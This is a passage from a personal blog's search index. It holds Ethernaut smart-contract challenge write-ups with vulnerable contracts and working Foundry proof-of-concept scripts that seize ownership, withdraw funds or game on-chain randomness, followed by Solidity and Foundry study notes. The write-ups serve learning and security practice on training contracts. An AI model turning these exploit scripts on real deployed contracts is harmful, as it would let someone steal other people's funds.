&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;as we send eth to the contract , the ownership automatically changed to us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;         receive ETH
              |
         msg.data empty？
            /  \
           T    F
          /      \
receive() exists?   fallback()
        / \
       T   F
      /     \
receive()   fallback()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;so the answer:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;contibute&lt;/code&gt; to fund our account in contract&lt;/li&gt;
&lt;li&gt;&lt;code&gt;call{value: }(&amp;quot;&amp;quot;)&lt;/code&gt; to send eth to contract , trigger the &lt;code&gt;fallback&lt;/code&gt; (in this case &lt;code&gt;receive&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;owner changed and &lt;code&gt;withdraw&lt;/code&gt; all the fund in contract&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {Fallback} from &amp;quot;../src/Fallback.sol&amp;quot;;

error callFailed();

contract fallBackSolution is Script {
    function run() external {
        uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
        Fallback fallBackInstance = Fallback(payable(vm.envAddress(&amp;quot;FALLBACK_ADDRESS&amp;quot;)));
        // Fallback fallBackInstance = Fallback(payable(0x8Dafc24Ac2B813590f0a6b007159a1140c5Fd33c));

        console.log(&amp;quot;fallbackInstanceAddress: &amp;quot;, address(fallBackInstance));

        vm.startBroadcast(PK);

        fallBackInstance.contribute{value: 1}();

        (bool temp,) = payable(fallBackInstance).call{value: 1}(&amp;quot;&amp;quot;);
        if (!temp) revert callFailed();

        console.log(&amp;quot;New owner: &amp;quot;, fallBackInstance.owner());

        fallBackInstance.withdraw();

        vm.stopBroadcast();
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;fallout&#34;&gt;Fallout&lt;/h2&gt;
&lt;p&gt;our goal:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;claim the ownership&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;original contract:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import &amp;quot;openzeppelin-contracts-06/math/SafeMath.sol&amp;quot;;
// forge install openzeppelin-contracts-06=OpenZeppelin/openzeppelin-contracts@v3.4.0

contract Fallout {
    using SafeMath for uint256;

    mapping(address =&amp;gt; uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, &amp;quot;caller is not the owner&amp;quot;);
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] &amp;gt; 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;call the function &lt;code&gt;Fal1out&lt;/code&gt; to gain the ownership&lt;/p&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {Fallout} from &amp;quot;../src/Fallout.sol&amp;quot;;

contract CounterScript is Script {
    uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
    address instanceAddress = vm.envAddress(&amp;quot;FALLOUT_ADDRESS&amp;quot;);

    function run() public {
        Fallout fallOut = Fallout(instanceAddress);

        vm.startBroadcast(PK);

        console.log(&amp;quot;contract owner: &amp;quot;, fallOut.owner());
        console.log(&amp;quot;calling Fal1out...&amp;quot;);

        fallOut.Fal1out();

        console.log(&amp;quot;contract owner: &amp;quot;, fallOut.owner());

        vm.stopBroadcast();
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;coinflip&#34;&gt;CoinFlip&lt;/h2&gt;
&lt;p&gt;our goal:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;win 10 times in a row&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;original contract:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the contract uses unsafe factor which we can predict the side of coin each time&lt;br&gt;
when writing exp , there are few things need to concern:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;block.number&lt;/code&gt; was &lt;code&gt;0&lt;/code&gt; when not pointed , use &lt;code&gt;vm.roll()&lt;/code&gt; to set block number, otherwise it may take underflow error&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;--tc CoinFlipScript&lt;/code&gt; to point which contract to run&lt;/li&gt;
&lt;li&gt;The contract has hash check, however ,when we do local simulation the hash won&#39;t change. So use &lt;code&gt;--skip-simulation&lt;/code&gt; to skip simulation check&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {CoinFlip} from &amp;quot;../src/CoinFlip.sol&amp;quot;;

contract exp {
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 _tp = blockValue / FACTOR;

        console.log(&amp;quot;_tp: &amp;quot;, _tp);
        bool _side = _tp == 1 ? true : false;
        console.log(&amp;quot;_side: &amp;quot;, _side);

        _coinFlip.flip(_side);
    }
}

contract CoinFlipScript is Script {
    uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
    address instanceAddress = vm.envAddress(&amp;quot;COINFLIP_ADDRESS&amp;quot;);
    CoinFlip coinFlipInstance = CoinFlip(instanceAddress);
    // function setUp() public {}

    function run() public {
        // vm.broadcast();
        vm.roll(100);
        vm.startBroadcast(PK);
        for (uint256 i = 0; i &amp;lt; 10; i++) {
            vm.roll(100 + i);
            new exp(coinFlipInstance);
            console.log(&amp;quot;wins: &amp;quot;, coinFlipInstance.consecutiveWins());
        }
        vm.stopBroadcast();
    }
}

&lt;/code&gt;&lt;/pre&gt;
">Ethernaut challenges</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/SnPoU1Mup/"" data-c="
          &lt;h2 id=&#34;about-blockchain&#34;&gt;About blockchain&lt;/h2&gt;
&lt;h3 id=&#34;general&#34;&gt;general&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;smart contract is turing complete&lt;/li&gt;
&lt;li&gt;decentralized Oracle network(chainlink)+smart contracts == hybrid contracts&lt;/li&gt;
&lt;li&gt;Transaction fee = gasPrice * gasUsed&lt;/li&gt;
&lt;li&gt;SHA-like to process the data&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-it-worked&#34;&gt;how it worked&lt;/h3&gt;
&lt;h4 id=&#34;block-and-hash&#34;&gt;block and hash&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;blockchain built with block, a block is divided into &lt;code&gt;block&lt;/code&gt;, &lt;code&gt;nunce&lt;/code&gt;, and &lt;code&gt;data&lt;/code&gt;. All three are then run through the hash algorithm, producing the hash for that block.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;immutability&#34;&gt;Immutability&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;any changes of hash will make the rest of the chain invalidated&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;decentralization-distributed&#34;&gt;Decentralization &amp;amp; Distributed&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;multiple entities or &amp;quot;peers&amp;quot; run the blockchain technology, each holding equal weight and power.&lt;/li&gt;
&lt;li&gt;the majority rules&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;private-public-key&#34;&gt;Private &amp;amp;&amp;amp; Public key&lt;/h4&gt;
&lt;h3 id=&#34;sign-a-transaction&#34;&gt;sign a transaction&lt;/h3&gt;
&lt;h4 id=&#34;use-private-key-to-sign-a-signature&#34;&gt;use private key to sign a signature:&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;signature = sign(data, private_key)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;signature-created-to-use-public-key-to-verify-the-validation&#34;&gt;signature created to use public key to verify the validation:&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;verify(signature, public_key)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Your private key is super-secret, held securely by you alone as it holds the power to authorize transactions.&lt;/li&gt;
&lt;li&gt;The public key created via digital signature algorithm on your private key verifies your transaction signatures.&lt;/li&gt;
&lt;li&gt;The Ethereum address, an offshoot of your public key, is publicized and harmless.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;proof-of-work&#34;&gt;Proof of Work:&lt;/h3&gt;
&lt;p&gt;a civil resistance mechanism, a way to avert potential Sybil attacks&lt;br&gt;
(A Sybil attack is when a user creates numerous pseudonymous identities aiming to gain a disproportionately influential sway over the system.)&lt;/p&gt;
&lt;h3 id=&#34;l1-l2&#34;&gt;L1 &amp;amp;&amp;amp; L2:&lt;/h3&gt;
&lt;p&gt;these two options are developed to deal with the scaling issues, &lt;code&gt;L2 on top of L1&lt;/code&gt; extend &lt;code&gt;L1&lt;/code&gt; capabilities.&lt;/p&gt;
&lt;h2 id=&#34;solidity&#34;&gt;Solidity&lt;/h2&gt;
&lt;h3 id=&#34;of-function&#34;&gt;of function&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;everthing can be observed on the blockchain, &lt;code&gt;public&lt;/code&gt; only decides whether the function can be called both inside and outside of the contract; &lt;code&gt;external&lt;/code&gt; decides the function only to be called outside of the contract , &lt;code&gt;this.f()&lt;/code&gt;,&lt;code&gt;f()&lt;/code&gt; was the function; &lt;code&gt;internal&lt;/code&gt; function can be passed to inherited contract while &lt;code&gt;private&lt;/code&gt; can only be accessible in current contract.&lt;br&gt;
&lt;code&gt;view&lt;/code&gt; read-only , can read public state varible&lt;br&gt;
&lt;code&gt;pure&lt;/code&gt; can&#39;t read , but can return value of a new state varible . eg. &lt;code&gt;returns(uint256 a){a = a+1;}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;these two don&#39;t cost gas when run independently , but will require gas when called by another function that modifies the state or storage through a transaction.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;data-storage&#34;&gt;data storage:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;both &lt;code&gt;calldata&lt;/code&gt; and &lt;code&gt;memory&lt;/code&gt; are used for temporary varibles within a function zone(off-chain), &lt;code&gt;memory&lt;/code&gt; can be modified while the another can&#39;t&lt;/li&gt;
&lt;li&gt;&lt;code&gt;storage&lt;/code&gt; is permanent(on-chain).Variables declared outside any function, directly under the contract scope, are implicitly converted to storage variables.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mapping&#34;&gt;mapping:&lt;/h3&gt;
&lt;p&gt;used for reducing complexity&lt;br&gt;
in conclusion , like the follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-solidity&#34;&gt;mapping (string =&amp;gt; uint256) public nameToFavoriteNumber;

function add_list_of_person(string memory  _name, uint256 _favoriteNumber) public{
        list_of_people.push( Person(_favoriteNumber, _name) );
        NametoNumber[_name] = _favoriteNumber;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;address&#34;&gt;address:&lt;/h3&gt;
&lt;p&gt;the contract transfer 1wei to the addr&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;address payable addr; 
addr.transfer(1);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;contant&#34;&gt;contant*:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;constant&lt;/code&gt; can only be initialized on declaration , while &lt;code&gt;immutable&lt;/code&gt; can also be initialized in a constructor . &lt;code&gt;string &amp;amp; bytes&lt;/code&gt; can be declared as &lt;code&gt;constant&lt;/code&gt; but not  &lt;code&gt;immutable&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;imports&#34;&gt;imports:&lt;/h3&gt;
&lt;h4 id=&#34;import-contract&#34;&gt;import contract&lt;/h4&gt;
&lt;p&gt;use &lt;code&gt;named import&lt;/code&gt; like &lt;code&gt;import {} from &amp;quot;&amp;quot;&lt;/code&gt; instead of normal &amp;quot;import&amp;quot;&lt;br&gt;
or use eg. &lt;code&gt;forge install OpenZeppelin/openzeppelin-contracts --no-commit&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;import-from-npm-or-github&#34;&gt;import from NPM or github&lt;/h4&gt;
&lt;p&gt;take &lt;code&gt;AggregatorV3Interface&lt;/code&gt; as example&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import {AggregatorV3Interface} from &amp;quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;delegatecall&#34;&gt;delegatecall:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Proxy Contract&lt;/code&gt;  stores all relevant variables and stores the address of the logical contract,&lt;br&gt;
 all functions are stored in  &lt;code&gt;Logic Contract&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;contract-inheritance&#34;&gt;contract inheritance:&lt;/h3&gt;
&lt;p&gt;when declaring contract, use &lt;code&gt;contract xx is xx&lt;/code&gt; to inherit&lt;br&gt;
when redefining a function in the new &lt;code&gt;.sol&lt;/code&gt; file, remeber to add &lt;code&gt;virtual&lt;/code&gt; at the function in the inherited &lt;code&gt;.sol&lt;/code&gt; file and add &lt;code&gt;override&lt;/code&gt; in the new.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// old  inherited
function Store(uint256 _favoriteNumber) public virtual {}

// new  inherit
function Store(uint256 _newFavNumber) public override {}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;abi&#34;&gt;ABI:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;abi.encode()&lt;/code&gt; to interact with the contract, populates each parameter with 32 bytes of data and stitches it together.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodepacked()&lt;/code&gt; can be a shorter verison of &lt;code&gt;encode()&lt;/code&gt; , but cannot interact with the contract , usage can be calculate hash&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodeWithSignature()&lt;/code&gt; is of the same as the &lt;code&gt;encode()&lt;/code&gt; except its first param function signature, eg. &lt;code&gt;foo(uint256,address)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodeWithSelector()&lt;/code&gt; too, besides the first param function selector (the first 4-bytes keccak hash of function signature), eg. &lt;code&gt;bytes4(keccak256(&amp;quot;foo(uint256,address,string,uint256[2])&amp;quot;))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.decode()&lt;/code&gt; to revert the encoded&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;selector&#34;&gt;Selector:&lt;/h3&gt;
&lt;p&gt;to use selector call objective function:&lt;br&gt;
&lt;code&gt;.call(abi.encodedWithSelector(bytes4(keccak(&amp;quot;&amp;lt;functionSignature&amp;gt;&amp;quot;,param))))&lt;/code&gt;&lt;br&gt;
eg.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;    function callWithSignature() external returns(bool, bytes memory){
        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x6a627842, 0x2c44b726ADF1963cA47Af88B284C06f30380fC78));
        return(success, data);
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;library&#34;&gt;library:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;code&gt;library&lt;/code&gt; instead of &lt;code&gt;contract&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;no state variables&lt;/li&gt;
&lt;li&gt;use internal when declare a function (GPT:using &lt;code&gt;internal&lt;/code&gt; for library functions helps encapsulate functionality within the contract and prevents external access, which can help improve security and code organization.)&lt;/li&gt;
&lt;li&gt;When you use &lt;code&gt;using A for B;&lt;/code&gt; in Solidity, you are specifying that you want to add the functions of library &lt;code&gt;A&lt;/code&gt; as member functions of type &lt;code&gt;B&lt;/code&gt;. This allows you to call functions from the library directly on instances of &lt;code&gt;B&lt;/code&gt;, without specifying the library name.&lt;/li&gt;
&lt;li&gt;If a function does not require any parameters, you can call it directly by its name. Here&#39;s an example:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;using priceConverter for uint256;

msg.value.getConversionRate()

uint256 public version;
version = priceConverter.getVersion();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we can see that &lt;code&gt;msg.value&lt;/code&gt; is &lt;code&gt;uint256 type&lt;/code&gt; and it can be passed to the function as the first parameter ,so it calls the &lt;code&gt;getConversionRate()&lt;/code&gt; directly .&lt;br&gt;
while the &lt;code&gt;getVersion()&lt;/code&gt; can&#39;t for it does not need a parameter to pass.&lt;/p&gt;
&lt;h3 id=&#34;withdraw&#34;&gt;withdraw:&lt;/h3&gt;
&lt;p&gt;see below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;        // withdraw the fund using transfer , send , call
        // transfer , limited up to 2300 gas , pop up failure
        payable(msg.sender).transfer(address(this).balance);

        //send , limited up to 2300 gas , returns bool
        bool sendSuccess = payable(msg.sender).send(address(this).balance);
        require(sendSuccess,&amp;quot;send failed&amp;quot;);

        //call , no limited , returns bool and bytes
        (bool callSuccess, ) = payable(msg.sender).call{value:address(this).balance}(&amp;quot;&amp;quot;);
        require(callSuccess,&amp;quot;call failed&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;constructor-modifier&#34;&gt;constructor &amp;amp;&amp;amp; modifier:&lt;/h3&gt;
&lt;p&gt;see below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;    constructor() {
        owner = msg.sender; // executed once the contract deployed
    }   

    modifier onlyOwner{
        require(msg.sender == owner,&amp;quot;owner required&amp;quot;);
        _; // code executed after the above line
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;error&#34;&gt;error:&lt;/h3&gt;
&lt;p&gt;among &lt;code&gt;error,require,assert&lt;/code&gt; , &lt;code&gt;error&lt;/code&gt; was the first choice&lt;br&gt;
define it outside of the contract&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;error notEnoughUsd();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and use &lt;code&gt;if&lt;/code&gt; to make a judgement , use &lt;code&gt;revert&lt;/code&gt; to call up the &lt;code&gt;error&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if(msg.value.getConversionRate() &amp;lt;= MINIUM_USD) {
            revert notEnoughUsd();
        }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;event-fallback&#34;&gt;event &amp;amp;&amp;amp; fallback:&lt;/h3&gt;
&lt;p&gt;event will record the value you specify , up to 3 &lt;code&gt;indexed&lt;/code&gt; arg&lt;br&gt;
declare :&lt;code&gt;event Name(var1,var2,var3)&lt;/code&gt;, to trigger use &lt;code&gt;emit Name(arg1,arg2,arg3)&lt;/code&gt;&lt;br&gt;
the info will be in logs&lt;/p&gt;
&lt;p&gt;the later version divides the &lt;code&gt;fallback&lt;/code&gt; into two parts, &lt;code&gt;receive &amp;amp; fallback&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;receive() external payable { }
fallback() external payable { }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;fallback()&lt;/code&gt; or &lt;code&gt;receive()&lt;/code&gt;?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;         receive ETH
              |
         msg.data empty？
            /  \
           T    F
          /      \
receive() exists?   fallback()
        / \
       T   F
      /     \
receive()   fallback()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;about-foundry&#34;&gt;About Foundry:&lt;/h2&gt;
&lt;h3 id=&#34;installation&#34;&gt;installation:&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc
foundryup
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;plugins-and-pre-setup-in-vsc&#34;&gt;plugins and pre-setup in vsc:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;solidity by Nomic Foundation&lt;/li&gt;
&lt;li&gt;even better toml&lt;/li&gt;
&lt;li&gt;auto-format when saving&lt;/li&gt;
&lt;li&gt;&lt;code&gt;forge install ChainAccelOrf/foundry-devops --no-commit&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;setting-up-a-new-project&#34;&gt;setting up a new project:&lt;/h3&gt;
&lt;p&gt;use &lt;code&gt;forge init --force .&lt;/code&gt; to force-set current dir to be project dir.&lt;/p&gt;
&lt;h3 id=&#34;compile&#34;&gt;compile:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;forge build&lt;/code&gt; or &lt;code&gt;forge compile&lt;/code&gt;&lt;br&gt;
unlike remix import contract from npm packages , foundry has to import manually and do some remmaping&lt;br&gt;
import with remapping :&lt;br&gt;
&lt;code&gt;forge install smartcontractkit/chainlink-brownie-contracts&lt;/code&gt;&lt;br&gt;
and simply go to &lt;code&gt;foundry.toml&lt;/code&gt; and add  &lt;code&gt;remappings = [&amp;quot;@chainlink=lib/chainlink-brownie-contracts&amp;quot;]&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy&#34;&gt;deploy:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;locally:&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;start anvil&lt;/li&gt;
&lt;li&gt;&lt;code&gt;forge create SimpleStorage --rpc-url http://127.0.0.1:8545 --interactive&lt;/code&gt; and then enter private key or &lt;code&gt;forge create &amp;lt; name-of-your-contract &amp;gt; --rpc-url $RPC_URL --private-key $RRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;on chain:&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;start anvil&lt;/li&gt;
&lt;li&gt;write deploy script:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from &amp;quot;forge-std/Script.sol&amp;quot;; // import script
import {SimpleStorage} from &amp;quot;../src/SimpleStorage.sol&amp;quot;; // import src contract

contract DeploySimpleStorage is Script {
    function run() external returns (SimpleStorage) {
        vm.startBroadcast(); // start from this line

        SimpleStorage simpleStorage = new SimpleStorage(); // broadcast content

        vm.stopBroadcast(); // end at this line
        return simpleStorage;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;forge script script/DeploySimpleStorage.s.sol --rpc-url $RPC_URL --broadcast --private-key $PRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;interactive&#34;&gt;interactive:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;to sign and publish a transaction use &lt;code&gt;cast send &amp;lt;contract_addr&amp;gt; &amp;quot;&amp;lt;funtion_name&amp;gt;(&amp;lt;arg_type&amp;gt;)&amp;quot; &amp;lt;value&amp;gt; --private-key $PRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;to reads off the blockchain use &lt;code&gt;cast call &amp;lt;contract_addr&amp;gt; &amp;quot;&amp;lt;function_name&amp;gt;(&amp;lt;arg_type&amp;gt;)&amp;quot;&lt;/code&gt;&lt;br&gt;
tip: use &lt;code&gt;cast --to-base &amp;lt;hex&amp;gt; dec&lt;/code&gt; to convert a hex to dec&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;test&#34;&gt;test:&lt;/h3&gt;
&lt;h4 id=&#34;remote&#34;&gt;remote:&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;in test folder we have &lt;code&gt;.t.sol&lt;/code&gt;&lt;br&gt;
eg.&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from &amp;quot;forge-std/Test.sol&amp;quot;; // import Test and console
import {FundMe} from &amp;quot;../src/FundMe.sol&amp;quot;; // import src contract
import {DeployFundMe} from &amp;quot;../script/DeployFundMe.s.sol&amp;quot;;

contract FundMeTest is Test {
    FundMe fundMe; // variable in storage

    function setUp() external {
        DeployFundMe deployFundMe = new DeployFundMe();
        fundMe = deployFundMe.run();
    }

    function testMiniumUSD() public view {
        console.log(&amp;quot;check if minium usd&amp;quot;);
        console.log(fundMe.MINIUM_USD());
        assertEq(fundMe.MINIUM_USD(), 1e18); // assert equal
    }

    function testIsOWNER() public view {
        console.log(&amp;quot;check if owner&amp;quot;);
        console.log(fundMe.OWNER());
        console.log(address(this));
        console.log(msg.sender);
        assertEq(fundMe.OWNER(), msg.sender);
    }

    function testPriceFeedVersionIsAccurate() public view {
        console.log(&amp;quot;check if version accurate&amp;quot;);
        uint256 version = fundMe.getPriceFeedVersion();
        console.log(version);
        console.log(fundMe.getPriceFeedVersion());
        assertEq(version, 4);
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;some command:&lt;br&gt;
&lt;code&gt;forge test -vv &lt;/code&gt; for details  ;&lt;br&gt;
&lt;code&gt;forge test --match-test&lt;/code&gt; to test single function,&lt;code&gt;--match-path&lt;/code&gt; for single file,&lt;code&gt;--match-contract&lt;/code&gt; for single contract;&lt;br&gt;
&lt;code&gt;forge inspect &amp;lt;contract&amp;gt; storageLayout&lt;/code&gt; to checkout the storage of the varibles;&lt;br&gt;
&lt;code&gt;forge snapshot &lt;/code&gt; to see gas usage or simply &lt;code&gt;--gas-report&lt;/code&gt;&lt;br&gt;
&lt;code&gt;forge remappings&lt;/code&gt; to automatically try remapping&lt;br&gt;
tips: for some tests may need to run on testnet ,use  like&lt;code&gt;forge test -vvv --fork-url $SEPOLIA_RPC&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;local&#34;&gt;local:&lt;/h4&gt;
&lt;p&gt;so in this situation , to simplify the whole process and make the code more readable, we use the following to pass the address:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;helperconfig.s.sol(to decide which net to use) returns an address&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;address above transfferd to Deploy.s.sol , then the address passed as parameter of the contract we meant to deploy&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;as for our test module, we directly &#39;setUp()&#39; using imported &#39;Deploy&#39; &lt;/code&gt;&lt;br&gt;
check out a repo for detail: &lt;a href=&#34;https://github.com/OraclePi/foundry-FundMe&#34;&gt;https://github.com/OraclePi/foundry-FundMe&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;cheatcodes&#34;&gt;cheatcodes:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vm.expectRevert()&lt;/code&gt; the line follows it should revert, otherwise it would fail&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.prank()&lt;/code&gt; set a specific address for the next TX , eg. &lt;code&gt;fund check if owner&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.startPrank()&lt;/code&gt; works the same as &lt;code&gt;vm.prank()&lt;/code&gt; besides that it stops until &lt;code&gt;vm.stopPrank()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;makeAddr()&lt;/code&gt; to create a new addr&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.deal(address who, uint256 newBalance)&lt;/code&gt; to  set balance of the addr&lt;/li&gt;
